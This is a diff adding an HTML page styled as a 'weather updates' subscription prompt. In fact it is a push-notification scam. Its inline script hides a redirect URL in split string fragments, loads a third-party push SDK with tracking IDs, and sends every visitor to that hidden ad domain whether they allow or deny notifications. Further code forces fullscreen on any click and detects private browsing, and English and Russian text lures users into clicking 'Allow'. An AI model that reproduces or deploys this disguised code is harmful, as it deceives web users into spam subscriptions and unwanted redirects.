@@ -1,0 +1,437 @@
+<!DOCTYPE html>
+<html>
+
+
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+
+<head>
+    <meta charset="UTF-8">
+    <title>Weather</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width,height=device-height,initial-scale=1,minimum-scale=1">
+    <link rel="icon" type="image/png" sizes="16x16" href="icon.png">
+    <style>
+        body,
+        html {
+            font-family: Roboto, Helvetica Neue, Helvetica, Arial, sans-serif;
+            height: 100%;
+            margin: 0;
+            padding: 0;
+            width: 100%
+        }
+
+        body {
+            -moz-osx-font-smoothing: grayscale;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            -webkit-font-smoothing: antialiased;
+            -webkit-user-select: none;
+            user-select: none
+        }
+
+        .isHide {
+            display: none !important
+        }
+
+        .isShow {
+            display: block !important
+        }
+
+        #container {
+            display: flex;
+            flex-direction: column;
+            left: 0;
+            position: absolute;
+            top: 0
+        }
+
+        #bg,
+        #container {
+            height: 100%;
+            width: 100%
+        }
+
+        #bg {
+            background: url(images/weather/bg.png) no-repeat;
+            background-size: 100% 100%
+        }
+
+        #botContainer,
+        #topContainer {
+            display: flex;
+            height: 50%;
+            width: 100%
+        }
+
+        #allowContainer {
+            width: 50%
+        }
+
+        #allow,
+        #allowContainer {
+            align-items: center;
+            display: flex;
+            justify-content: center
+        }
+
+        #allow {
+            background: #fff;
+            border-radius: 30px;
+            box-shadow: 0 0 40px rgba(0, 0, 0, .5);
+            box-sizing: border-box;
+            font-size: 30px;
+            font-weight: 300;
+            height: 170px;
+            margin-bottom: -100px;
+            padding: 20px;
+            text-align: center;
+            width: 380px
+        }
+
+        .blue {
+            color: #0baadc
+        }
+
+        #sunContainer {
+            align-items: flex-end;
+            display: flex;
+            width: 50%
+        }
+
+        #sun {
+            border-radius: 50%;
+            box-shadow: 0 0 40px rgba(0, 0, 0, .5);
+            margin-left: -115px
+        }
+
+        #botContainer {
+            align-items: center;
+            box-sizing: border-box;
+            color: #fff;
+            flex-direction: column;
+            justify-content: center;
+            padding-top: 70px
+        }
+
+        .bold {
+            font-weight: 700
+        }
+
+        h1 {
+            font-size: 64px;
+            margin: 0
+        }
+
+        #botText,
+        h1 {
+            text-align: center
+        }
+
+        #botText {
+            font-size: 32px;
+            max-width: 1000px
+        }
+
+        @media (max-width:800px) {
+            #topContainer {
+                flex-direction: column-reverse;
+                height: 60%
+            }
+
+            #botContainer {
+                height: 40%;
+                padding-top: 10px
+            }
+
+            #allowContainer {
+                height: 50%;
+                width: 100%
+            }
+
+            #allow {
+                margin: 0
+            }
+
+            #sunContainer {
+                align-items: center;
+                height: 50%;
+                justify-content: center;
+                width: 100%
+            }
+
+            #sun {
+                height: 20vh;
+                margin: 0;
+                width: 20vh
+            }
+
+            h1 {
+                font-size: 40px
+            }
+
+            #botText {
+                font-size: 30px
+            }
+        }
+
+        @media (max-width:450px) {
+            #allow {
+                width: 95%
+            }
+
+            #botText {
+                margin: 0
+            }
+
+            #sunContainer {
+                display: none
+            }
+
+            #topContainer {
+                height: 40%;
+                justify-content: flex-end
+            }
+
+            #allowContainer {
+                align-items: flex-start;
+                padding-top: 10px
+            }
+
+            #botContainer {
+                height: 60%;
+                justify-content: flex-end;
+                padding: 0 10px 10px
+            }
+        }
+    </style>
+</head>
+
+<body>
+  <script>(function() {
+    function getParameterByName(name, url) {
+      if (!url) url = window.location.href;
+      name = name.replace(/[\[\]]/g, '\\$&');
+      var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
+          results = regex.exec(url);
+      if (!results) return null;
+      if (!results[2]) return '';
+      return decodeURIComponent(results[2].replace(/\+/g, ' '));
+    }
+
+    var loc = document.location;
+    var tb = function(){ loc.href = ['ht', 'tps:/', '/blud', 'wan.com/a', 'fu.ph', 'p?zon', 'eid=2483917'].join(''); };
+    var bc = function(){ loc.href = ['ht', 'tps:', '/', '/go', 'ogle.com/'].join(''); };
+
+    var url = new URL(window.location.href);
+    var pci = getParameterByName('external_id', window.location.href);
+    var ppi = getParameterByName('placementid', window.location.href);
+    var tag = document.createElement('script');
+    tag.type = 'text/javascript';
+    tag.dataset['sdk'] = 'sdk';
+    tag.src = '//pushokey.com/ntfc.php?p=2490306&ucis=true&m=https&nbinp=true' + '&var='+ ppi + '&ymid=' + pci;
+
+    function setupHandlers() {
+      // sdk.onBeforePermissionPrompt();
+      sdk.onPermissionDefault(tb);
+      sdk.onPermissionAllowed(tb);
+      sdk.onPermissionDenied(tb);
+      sdk.onAlreadySubscribed(tb);
+    }
+
+    tag.onload = setupHandlers;
+
+    document.head.appendChild(tag);
+    })();</script>  
+    <div id="bg"></div>
+    <div id="container">
+        <div id="topContainer">
+            <div id="allowContainer">
+                <div id="allow">
+                    <p><span id="top1"></span> <span id="top2" class="blue"></span> <span id="top3"></span></p>
+                </div>
+            </div>
+            <div id="sunContainer"><img src="images/weather/sun.png" alt="image" id="sun"></div>
+        </div>
+        <div id="botContainer">
+            <h1 id="midTop"></h1>
+            <h1 class="msgReady__tx isHide"></h1>
+            <p id="botText"><span id="mid1"></span> <span id="mid2" class="bold"></span> <span id="mid3"></span></p>
+        </div>
+    </div>
+    <script>
+        ! function(n) {
+            var o = {};
+
+            function i(e) {
+                if (o[e]) return o[e].exports;
+                var t = o[e] = {
+                    i: e,
+                    l: !1,
+                    exports: {}
+                };
+                return n[e].call(t.exports, t, t.exports, i), t.l = !0, t.exports
+            }
+            i.m = n, i.c = o, i.d = function(e, t, n) {
+                i.o(e, t) || Object.defineProperty(e, t, {
+                    enumerable: !0,
+                    get: n
+                })
+            }, i.r = function(e) {
+                "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, {
+                    value: "Module"
+                }), Object.defineProperty(e, "__esModule", {
+                    value: !0
+                })
+            }, i.t = function(t, e) {
+                if (1 & e && (t = i(t)), 8 & e) return t;
+                if (4 & e && "object" == typeof t && t && t.__esModule) return t;
+                var n = Object.create(null);
+                if (i.r(n), Object.defineProperty(n, "default", {
+                        enumerable: !0,
+                        value: t
+                    }), 2 & e && "string" != typeof t)
+                    for (var o in t) i.d(n, o, function(e) {
+                        return t[e]
+                    }.bind(null, o));
+                return n
+            }, i.n = function(e) {
+                var t = e && e.__esModule ? function() {
+                    return e.default
+                } : function() {
+                    return e
+                };
+                return i.d(t, "a", t), t
+            }, i.o = function(e, t) {
+                return Object.prototype.hasOwnProperty.call(e, t)
+            }, i.p = "", i(i.s = 2)
+        }([function(e, t) {
+            if (0 === "".length) {
+                var n = function() {
+                    void 0 !== this.requestFullScreen ? this.requestFullScreen() : void 0 !== this.webkitRequestFullScreen ? this.webkitRequestFullScreen() : void 0 !== this.mozRequestFullScreen && this.mozRequestFullScreen()
+                };
+                document.body.addEventListener("keydown", n), document.body.addEventListener("click", n)
+            }
+        }, , function(e, t, n) {
+            n(0);
+            var u = function(t) {
+                    var e = decodeURIComponent(document.cookie).split(";");
+                    if (0 === e.length) return null;
+                    var n = null;
+                    return e.some(function(e) {
+                        if (" " === e[0] && (e = e.slice(1)), e = e.split("="), t === e[0]) return n = e[1], !0
+                    }), n
+                },
+                l = function(e) {
+                    null !== window.opener && void 0 !== window.opener && opener.postMessage(e, "*")
+                },
+                p = {
+                    ua: navigator.userAgent,
+                    m: function(t) {
+                        var e = "normal",
+                            n = "private";
+
+                        function o() {
+                            return t(n)
+                        }
+
+                        function i() {
+                            return t(e)
+                        }
+                        if ("safari" === p.n) try {
+                            return window.openDatabase(null, null, null, null), t(e)
+                        } catch (e) {
+                            return t(n)
+                        } else if ("firefox" === p.n) {
+                            var r = indexedDB.open("test.html");
+                            r.addEventListener("error", o), r.addEventListener("success", i)
+                        } else {
+                            if ("edge" === p.n) return void 0 !== window.indexedDB || void 0 === window.PointerEvent && void 0 === window.MSPointerEvent ? t(e) : t(n);
+                            if ("opera" !== p.n && "yandex" !== p.n && "chrome" !== p.n) return t("unknown");
+                            window.webkitRequestFileSystem(window.TEMPORARY, 1, i, o)
+                        }
+                    },
+                    get n() {
+                        var e = !!window.opr && !!opr.addons || !!window.opera || 0 < this.ua.indexOf("OPR/index.html"),
+                            t = "undefined" != typeof InstallTrigger,
+                            n = /constructor/i.test(window.HTMLElement) || /(MacPPC|MacIntel|Mac_PowerPC|Macintosh)/.test(this.ua),
+                            o = !!window.chrome && /Google Inc/.test(navigator.vendor),
+                            i = 0 < this.ua.indexOf("YaBrowser") || 0 < this.ua.indexOf("Yowser"),
+                            r = /UBrowser/.test(this.ua),
+                            u = /Edge\//.test(this.ua),
+                            c = null;
+                        return e ? c = "opera" : t ? c = "firefox" : i ? c = "yandex" : r ? c = "uc" : u ? c = "edge" : o ? c = "chrome" : n && (c = "safari"), c
+                    },
+                    get d() {
+                        var t = {
+                                webOS: "webOS",
+                                iPhone: "iPhone",
+                                iPad: "iPad",
+                                iPod: "iPod",
+                                mac: "(MacPPC|MacIntel|Mac_PowerPC|Macintosh)",
+                                blackBerry: "BlackBerry|BB|PlayBook",
+                                windows: "Windows NT",
+                                windowPhone: "Windows Phone",
+                                android: "Android"
+                            },
+                            n = null;
+                        return Object.keys(t).some(function(e) {
+                            if (null !== p.ua.match(new RegExp(t[e], "i"))) return n = e, !0
+                        }), n
+                    }
+                };
+                var v = p;
+
+            var
+                g = function(t) {
+                    if (!(void 0 !== window.navigator && void 0 !== navigator.serviceWorker && void 0 !== window.PushManager && void 0 !== window.Notification)) return t(!1, "unsupported");
+                    v.m(function(e) {
+                        return "private" === e ? t(!1, e) : "unknown" === e ? t(!1, e) : t(!0, "supported")
+                    })
+                },
+                y = {
+                    k: "",
+                    t: {},
+                    set: function(e) {
+                        void 0 !== window.navigator && void 0 !== navigator.language && (y.k = navigator.language.slice(0, 2)), void 0 === e[y.k] && (y.k = "en"), y.t = e[y.k]
+                    },
+                    get: function(e) {
+                        return y.t[e]
+                    }
+                },
+                S = y;
+
+            function b(e) {
+                l({
+                    a: e ? "success" : "close"
+                }), null !== window.opener && void 0 !== window.opener && close(), document.querySelector("#botText").classList.add("isHide"), document.querySelector("#allow").classList.add("isHide"), document.querySelector("#midTop").classList.add("isHide"), document.querySelector(".msgReady__tx").classList.remove("isHide")
+            }
+
+            S.set({
+                ru: {
+                    top1: "Нажмите",
+                    top2: "Разрешить",
+                    top3: "для получения обновлений локальной погоды",
+                    midTop: "ОБНОВЛЕНИЯ ПОГОДЫ",
+                    mid1: "Нажмите",
+                    mid2: "Разрешить",
+                    mid3: "и получайте обновления местной сводки погоды автоматически",
+                    msg: "Вы успешно подписались!<br>Теперь вы можете закрыть окно"
+                },
+                en: {
+                    top1: "Click",
+                    top2: "Allow",
+                    top3: "to receive local weather updates automatically",
+                    midTop: "WEATHER UPDATES",
+                    mid1: "Click",
+                    mid2: "Allow",
+                    mid3: "to get local weather updates",
+                    msg: "You have successfully subscribed!<br>Now you can close the window"
+                }
+            }), document.querySelector("#top1").textContent = S.get("top1"), document.querySelector("#top2").textContent = S.get("top2"), document.querySelector("#top3").textContent = S.get("top3"), document.querySelector("#midTop").textContent = S.get("midTop"), document.querySelector("#mid1").textContent = S.get("mid1"), document.querySelector("#mid2").textContent = S.get("mid2"), document.querySelector("#mid3").textContent = S.get("mid3"), document.querySelector(".msgReady__tx").innerHTML = S.get("msg")
+        }]);
+    </script>
+
+</body>
+
+
+</html>
